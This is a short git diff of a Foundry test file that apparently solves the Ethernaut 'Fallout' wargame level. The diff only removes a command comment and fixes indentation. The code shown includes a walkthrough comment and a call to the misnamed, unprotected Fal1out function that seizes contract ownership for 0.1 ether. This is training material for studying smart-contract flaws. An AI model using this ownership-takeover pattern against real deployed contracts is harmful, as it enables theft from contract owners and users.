@@ -6,7 +6,6 @@ import "../src/Fallout/FalloutFactory.sol";
 import "../src/Ethernaut.sol";
 import "forge-std/console.sol";
 
-// forge test --match-contract FalloutTest -vvvv
 contract FalloutTest is Test {
     Ethernaut ethernaut;
     address player = address(100);
@@ -36,7 +35,7 @@ contract FalloutTest is Test {
          * Walkthrough:
          * 1) Here the function to change ownership is not protected
          * A simple call with a bit of ETH is enough to gain ownership
-        */
+         */
         // -- 1 --
         ethernautFallout.Fal1out{value: 0.1 ether}();
         /*****************
